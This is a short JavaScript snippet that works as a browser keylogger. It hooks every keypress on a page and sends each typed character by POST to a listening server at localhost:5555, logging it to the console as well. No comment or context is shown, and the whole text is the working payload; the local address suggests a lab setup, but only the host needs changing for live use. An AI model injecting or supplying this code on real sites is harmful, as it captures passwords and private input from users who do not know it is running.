document.onkeypress = function(ev) {
  ev = ev || window.event;
  key = String.fromCharCode(ev.charCode);
  if (key) {
    var http = new XMLHttpRequest();
    var param = encodeURI(key);
    http.open("POST", "http://localhost:5555/", true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send("key=" + param);
    console.log(key);
  }
};
